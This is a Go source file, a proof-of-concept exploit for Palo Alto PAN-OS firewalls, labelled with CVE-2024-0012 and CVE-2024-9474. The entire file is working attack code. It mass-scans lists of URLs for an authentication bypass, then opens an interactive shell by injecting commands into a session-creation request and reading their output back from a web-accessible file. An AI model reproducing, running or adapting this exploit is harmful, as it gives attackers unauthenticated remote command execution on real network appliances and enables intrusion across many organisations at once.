package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/http/httputil"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/cheggaaa/pb/v3"
	"github.com/gookit/color"
	"github.com/manifoldco/promptui"
	"github.com/p0dalirius/goopts/parser"
)

var (
	baseURL   string
	filePath  string
	output    string
	threads   int
	urls      []string
	outputMtx sync.Mutex
)

type ExploitClient struct {
	client  *http.Client
	headers map[string]string
}

func (ec *ExploitClient) newRequest(method, url, payload string) (*http.Request, error) {
	var body io.Reader
	if payload != "" {
		body = strings.NewReader(payload)
	}

	req, err := http.NewRequest(method, url, body)
	if err != nil {
		return nil, err
	}

	for key, value := range ec.headers {
		req.Header.Set(key, value)
	}

	return req, nil
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func printOverBar(msg string) {
	fmt.Printf("\r\033[K%s\n", msg)
}

func parseArgs() {
	ap := parser.ArgumentsParser{
		Banner: color.Cyan.Sprintf("Palo Alto PAN-OS Exploit PoC - CVE-2024-0012 & CVE-2024-9474"),
	}

	ap.NewStringArgument(&baseURL, "-u", "--url", "", false, "Target base URL (e.g., http://example.com).")
	ap.NewIntArgument(&threads, "-t", "--threads", 200, false, "Concurrent threads.")

	ap.NewStringArgument(&filePath, "-f", "--file", "", false, "File with multiple URLs.")
	ap.NewStringArgument(&output, "-o", "--output", "output.txt", false, "Output file for scan results.")

	ap.Parse()

	if filePath != "" && baseURL != "" {
		color.Error.Println("[error] Cannot use both Scan Mode and Exploit Mode at the same time.")
		os.Exit(1)
	}

	if filePath == "" && baseURL == "" {
		color.Error.Println("[error] Must specify either Scan Mode (--file) or Exploit Mode (--url).")
		os.Exit(1)
	}
}

func saveToFile(data string) {
	outputMtx.Lock()
	defer outputMtx.Unlock()
	file, err := os.OpenFile(output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		color.Error.Println("[error] Could not save to file:", err)
		return
	}
	defer file.Close()
	file.WriteString(data)
}

func scanModeFunc(url string, bar *pb.ProgressBar, ec *ExploitClient) {
	defer bar.Increment()

	fullURL := fmt.Sprintf("%s/php/ztp_gate.php/.js.map", url)
	req, _ := ec.newRequest("GET", fullURL, "")

	resp, err := ec.client.Do(req)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		body, err := io.ReadAll(resp.Body)
		if err != nil {
			return
		}

		if strings.Contains(string(body), "Zero Touch Provisioning") {
			saveToFile(fmt.Sprintf("%s - Auth Bypass successful\n", url))
			printOverBar(fmt.Sprintf("[+] %s - Auth Bypass successful", url))
		}
	}
}

func createCustomProgressBar(total int) *pb.ProgressBar {
	bar := pb.New(total)
	bar.SetTemplate(pb.ProgressBarTemplate(`{{ red "Progress:" }} {{ bar . "[" "#" "-" ">" }} {{percent .}} {{counters .}}`))
	bar.SetRefreshRate(200 * time.Millisecond)
	bar.SetWriter(os.Stderr)
	bar.Start()
	return bar
}

func exploitModeFunc(url string, ec *ExploitClient) {
	outputName := fmt.Sprintf("%d.txt", rand.Intn(10000))

	for {
		prompt := promptui.Prompt{
			Label: "#",
		}

		cmd, err := prompt.Run()
		if err != nil {
			fmt.Printf("[-] %s: Failed to read command: %s\n", url, err)
			continue
		}

		cmd = strings.TrimSpace(cmd)

		if cmd == "exit" {
			fmt.Println("[+] Exiting interactive shell.")
			break
		}

		payload := fmt.Sprintf("user=`echo $(%s) > /var/appweb/htdocs/unauth/%s`&userRole=superuser&remoteHost=&vsys=vsys1", cmd, outputName)

		fullURL := fmt.Sprintf("%s/php/utils/createRemoteAppwebSession.php/peppa.js.map", url)
		req, err := ec.newRequest("POST", fullURL, payload)
		if err != nil {
			fmt.Printf("[-] %s: Failed to create request: %s\n", url, err)
			continue
		}

		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		dump, err := httputil.DumpRequestOut(req, true)
		if err == nil {
			fmt.Printf("[+] %s - Raw Request:\n%s\n", url, string(dump))
		}

		resp, err := ec.client.Do(req)
		if err != nil {
			fmt.Printf("[-] %s: %s\n", url, err)
			continue
		}
		defer resp.Body.Close()

		body, _ := io.ReadAll(resp.Body)
		responseBody := string(body)
		fmt.Printf("[+] %s - Response Body:\n%s\n", url, responseBody)

		var phpsessid string
		re := regexp.MustCompile("@start@PHPSESSID=([a-zA-Z0-9]+)@end@")
		matches := re.FindStringSubmatch(responseBody)
		if len(matches) == 2 {
			phpsessid = matches[1]
		}

		if phpsessid != "" {
			indexURL := fmt.Sprintf("%s/index.php/.js.map", url)
			indexReq, err := ec.newRequest("GET", indexURL, "")
			if err != nil {
				fmt.Printf("[-] %s: Failed to create index.php request: %s\n", url, err)
				continue
			}
			indexReq.Header.Set("Cookie", fmt.Sprintf("PHPSESSID=%s", phpsessid))
			indexReq.Header.Set("Connection", "keep-alive")

			indexResp, err := ec.client.Do(indexReq)
			if err != nil {
				fmt.Printf("[-] %s: %s\n", url, err)
				continue
			}
			defer indexResp.Body.Close()
		}

		outputURL := fmt.Sprintf("%s/unauth/%s", url, outputName)
		outputReq, err := ec.newRequest("GET", outputURL, "")
		if err != nil {
			fmt.Printf("[-] %s: Failed to create output request: %s\n", url, err)
			continue
		}

		outputResp, err := ec.client.Do(outputReq)
		if err != nil {
			fmt.Printf("[-] %s: %s\n", url, err)
			continue
		}
		defer outputResp.Body.Close()

		if outputResp.StatusCode == 200 {
			outputBody, _ := io.ReadAll(outputResp.Body)
			outputBodyStr := string(outputBody)
			fmt.Printf("[+] %s - Command Output:\n%s\n", url, outputBodyStr)
		} else {
			fmt.Printf("[-] %s - Failed to retrieve command output with status code: %d\n", url, outputResp.StatusCode)
		}
	}
}

func main() {
	parseArgs()

	if filePath != "" {
		file, err := os.Open(filePath)
		if err != nil {
			color.Error.Println("[error] Failed to open file:", err)
			os.Exit(1)
		}
		defer file.Close()
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			urls = append(urls, strings.TrimSpace(scanner.Text()))
		}
	} else {
		urls = append(urls, baseURL)
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	ec := &ExploitClient{
		client: client,
		headers: map[string]string{
			"User-Agent":      "PEPPA PIG",
			"X-PAN-AUTHCHECK": "off",
		},
	}

	if filePath != "" {
		bar := createCustomProgressBar(len(urls))
		var wg sync.WaitGroup

		for _, url := range urls {
			wg.Add(1)
			go func(url string) {
				defer wg.Done()
				scanModeFunc(url, bar, ec)
			}(url)
		}

		wg.Wait()
		bar.Finish()
		color.Success.Printf("[+] Results saved to %s\n", output)
	} else {
		exploitModeFunc(baseURL, ec)
	}
}
